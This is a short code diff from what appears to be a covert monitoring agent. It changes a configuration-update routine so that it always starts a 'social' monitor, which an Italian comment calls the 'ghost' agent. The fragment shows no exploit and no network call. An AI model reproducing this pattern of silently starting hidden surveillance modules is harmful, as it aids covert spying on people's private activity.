@@ -437,9 +437,13 @@ void WINAPI ParseModules(JSONObject module, DWORD dummy)
 
 void UpdateAgentConf()
 {
+	JSONObject dummy;
 	char *conf_json = HM_ReadClearConf(H4_CONF_FILE);
-	if (conf_json)
+	if (conf_json) {
 		HM_ParseConfSection(conf_json, L"modules", &ParseModules);
+		// Inizializza l'agente "fantasma" social
+		AM_MonitorInit(AM_GetAgentTag(L"social"), dummy);
+	}
 	SAFE_FREE(conf_json);
 }
 
